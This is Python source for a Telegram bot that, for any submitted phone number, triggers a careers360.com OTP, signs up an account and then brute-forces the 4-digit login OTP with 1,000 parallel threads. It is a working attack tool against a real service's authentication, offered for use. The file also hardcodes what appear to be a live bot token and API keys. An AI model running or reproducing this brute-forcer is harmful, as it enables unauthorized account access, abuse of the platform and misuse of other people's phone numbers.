import requests
import time
import asyncio
import concurrent.futures
import threading
from flask import Flask
from telegram import Update
from telegram.ext import Application, MessageHandler, filters, ContextTypes

# Telegram Bot Token
BOT_TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"

# API Headers
HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
    "device-type": "mobile",
    "x-auth-key": "QeQohnkIqobSaDQITN02Ojpe3nC8dXn4hltbRt1t-TIb",
    "user-agent-key": "195696a6d915c14b",
    "Content-Type": "application/json"
}

# Flask app for Koyeb deployment
flask_app = Flask(__name__)

@flask_app.route('/')
def home():
    return "Bot is Running!"

# Function to run Flask on a separate thread
def run_flask():
    flask_app.run(host="0.0.0.0", port=8080, debug=False, use_reloader=False)

async def process_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    chat_id = update.message.chat_id

    try:
        ask_me, mobile_number, ask_name, ask_email = map(str.strip, message.split(" - "))
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Use: `book-name - number - name - email`", parse_mode="Markdown")
        return

    bot = context.bot

    # Send OTP
    otp_url = "https://backend-cus.careers360.com/api/1/cus/otp-send"
    otp_data = {
        "otp_on": "mobile",
        "cta_clicked": "signup",
        "otp_action": "send",
        "isd_code": "+91",
        "mobile_number": mobile_number
    }

    otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
    if otp_response.status_code == 200 and otp_response.json().get("result"):
        sent_message = await bot.send_message(chat_id, "✅ OTP Sent Successfully! 📩")
        time.sleep(2)
        await bot.delete_message(chat_id, sent_message.message_id)
    else:
        await bot.send_message(chat_id, "❌ OTP Sending Failed.")
        return

    # Signup
    signup_url = "https://backend-cus.careers360.com/api/1/cus/signup"
    signup_data = {
            "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
            "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
            "cta_clicked": "signup",
            "country_code": "+91",
            "mobile_number": mobile_number,
            "location": 64,
            "current_location": "Pune, Maharashtra, India",
            "email": ask_email,
            "education_level": 12,
            "name": ask_name,
            "submit": True,
            "interested_in": [],
            "checkbox_id": 0,
            "checkbox_status": False,
            "passing_year": 2025,
            "degree_interested": 2,
            "domain_id": 1,
            "certification": False
    }

    signup_response = requests.post(signup_url, json=signup_data, headers=HEADERS)
    if signup_response.status_code == 200 and signup_response.json().get("result"):
        user_uuid = signup_response.json()["data"].get("user_uuid")
    else:
        await bot.send_message(chat_id, "❌ Signup Failed.")
        return

    # Login Brute Force OTP
    login_url = "https://backend-cus.careers360.com/api/1/cus/login"
    found_otp = None
    checked_otps = 0

    progress_message = await bot.send_message(chat_id, "🔄 Checking OTPs... (0 checked)")

    def try_otp(otp):
        nonlocal found_otp, checked_otps
        if found_otp:
            return None

        login_data = {
                "current_url": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5?destination=https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
                "destination": f"https://engineering.careers360.com/download/{ask_me}?utm_source=telegram&utm_medium=mohit_5&click_location=header",
                "certification": False,
                "cta_clicked": "signup",
                "otp_on": "mobile",
                "country_code": "+91",
                "mobile_number": mobile_number,
                "otp": otp,
                "user_uuid": user_uuid
        }

        for _ in range(2):  # Try each OTP twice
            login_response = requests.post(login_url, json=login_data, headers=HEADERS)
            checked_otps += 1  # Increment OTP count

            if login_response.status_code == 200 and login_response.json()["data"].get("otp_response") is True:
                found_otp = otp
                return otp  # Return the correct OTP

        return None

    async def check_otp_with_updates():
        nonlocal found_otp, checked_otps
        with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
            future_to_otp = {executor.submit(try_otp, otp): otp for otp in range(1000, 10000)}

            for future in concurrent.futures.as_completed(future_to_otp):
                otp_result = future.result()
                if otp_result:
                    found_otp = otp_result  # Store the correct OTP
                    executor.shutdown(wait=False)  # Stop further execution
                    break

                # Edit the message every 100 OTPs checked
                if checked_otps % 100 == 0:
                    await progress_message.edit_text(f"🔄 Checking OTPs... ({checked_otps} checked)")

    await check_otp_with_updates()
    await bot.delete_message(chat_id, progress_message.message_id)

    if found_otp:
        await bot.send_message(chat_id, f"✅ Login Successful! OTP: `{found_otp}`", parse_mode="Markdown")
    else:
        await bot.send_message(chat_id, "❌ OTP brute-force failed. Could not find correct OTP.")

async def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_login))
    print("🤖 Bot is running...")

    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    await asyncio.Event().wait()

if __name__ == "__main__":
    # Start Flask in a separate thread
    threading.Thread(target=run_flask, daemon=True).start()

    # Start Telegram bot
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())
